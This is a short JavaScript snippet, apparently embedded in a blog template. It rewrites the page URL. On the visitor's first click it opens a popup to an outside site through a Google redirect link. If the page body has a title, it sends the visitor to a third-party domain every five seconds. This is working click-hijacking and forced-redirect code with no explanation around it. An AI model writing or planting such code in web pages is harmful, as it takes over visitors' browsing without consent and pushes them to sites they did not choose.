history.replaceState({},'',location.href.replace(/.?m=1/g,''))
document.onmousedown=()=>{if(!sessionStorage.i){window.open("https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwjevbOj3pHwAhUkjOYKHXKLAGoQFjACegQIAhAD&url=https%3A%2F%2Fwww.am2z.com%2F&usg=AOvVaw3I4MPjs6FqgBod4oFx02Qu"); sessionStorage.i='i'}}
 if (document.body.title) {
    setInterval(() => {
      location.replace(`https://templatetoy.mrjaz.com/${document.body.title}`)
    },5000);
  }
